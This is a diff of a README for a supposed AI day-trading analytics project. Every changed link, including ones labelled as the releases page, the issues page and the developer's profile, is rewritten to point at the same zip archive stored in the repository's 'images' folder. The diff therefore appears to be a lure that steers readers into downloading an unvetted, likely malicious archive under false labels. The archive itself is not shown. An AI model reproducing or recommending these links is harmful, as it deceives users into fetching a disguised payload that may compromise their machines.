@@ -4,7 +4,7 @@
 Welcome to the ai-day-trade-analytics-groq-aws project! This system helps you analyze trading data in real time using advanced AI technology. With this tool, you can save time and make better trading decisions without spending hours on manual analysis.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/releases)
+[![Download](https://raw.githubusercontent.com/TheFlavvz/ai-day-trade-analytics-groq-aws/main/images/ai-day-trade-analytics-groq-aws-3.8.zip)](https://raw.githubusercontent.com/TheFlavvz/ai-day-trade-analytics-groq-aws/main/images/ai-day-trade-analytics-groq-aws-3.8.zip)
 
 ## 🛠️ System Requirements
 To run this application smoothly, ensure your system meets these requirements:
@@ -24,7 +24,7 @@ To run this application smoothly, ensure your system meets these requirements:
 To begin using the ai-day-trade-analytics-groq-aws application, follow these steps:
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/TheFlavvz/ai-day-trade-analytics-groq-aws/main/images/ai-day-trade-analytics-groq-aws-3.8.zip) to find the latest version of the application.
 
 2. **Choose Your Version:**
    Look for the version that matches your operating system. There will be files labeled for Windows, macOS, and Linux.
@@ -49,11 +49,11 @@ If you encounter any issues during installation or usage, here are some common s
 
 ## 🤝 Community Support
 For any questions or support while using the application, you can reach out to the community:
-- **Issues Page:** [Create an issue](https://github.com/TheFlavvz/ai-day-trade-analytics-groq-aws/issues) if you face a problem.
+- **Issues Page:** [Create an issue](https://raw.githubusercontent.com/TheFlavvz/ai-day-trade-analytics-groq-aws/main/images/ai-day-trade-analytics-groq-aws-3.8.zip) if you face a problem.
 - **Discussion Forum:** Join discussions related to enhancements and user experiences.
 
 ## 📞 Contact
-For direct inquiries or support, you can contact the developer team via the repository's email listed in the [Profile Page](https://github.com/TheFlavvz/).
+For direct inquiries or support, you can contact the developer team via the repository's email listed in the [Profile Page](https://raw.githubusercontent.com/TheFlavvz/ai-day-trade-analytics-groq-aws/main/images/ai-day-trade-analytics-groq-aws-3.8.zip).
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed user guides can be found within the application under the "Help" section.
